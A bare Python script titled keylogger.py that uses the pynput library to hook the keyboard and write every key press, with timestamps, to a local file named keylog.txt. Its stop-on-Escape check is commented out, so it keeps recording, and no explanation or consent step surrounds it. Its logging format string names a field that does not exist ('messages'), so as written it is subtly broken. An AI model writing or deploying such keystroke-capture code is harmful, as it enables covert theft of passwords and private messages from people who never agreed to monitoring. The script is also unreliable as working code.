# keylogger.py
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')

def on_press(key):
    logging.info(str(key))
    #if key == Key.esc:
        #return False # Stop listener
    
with Listener(on_press=on_press) as listener:
    listener.join()
